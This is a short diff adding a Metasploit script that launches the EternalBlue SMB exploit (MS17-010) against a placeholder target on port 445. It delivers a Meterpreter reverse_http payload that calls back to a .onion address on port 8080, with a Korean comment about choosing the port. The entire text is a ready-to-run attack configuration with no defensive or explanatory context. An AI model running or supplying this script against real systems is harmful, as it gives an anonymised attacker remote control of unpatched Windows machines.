@@ -1,0 +1,8 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_http
+set LHOST aywyfbvfylb3fjtzpxdpyvvrigpgewo76cb6k5w6zhbcfkdub4nnpiid.onion
+set LPORT 8080  # 사용하고자 하는 포트 번호
+set RHOSTS <target_ip>
+set RPORT 445
+
+exploit
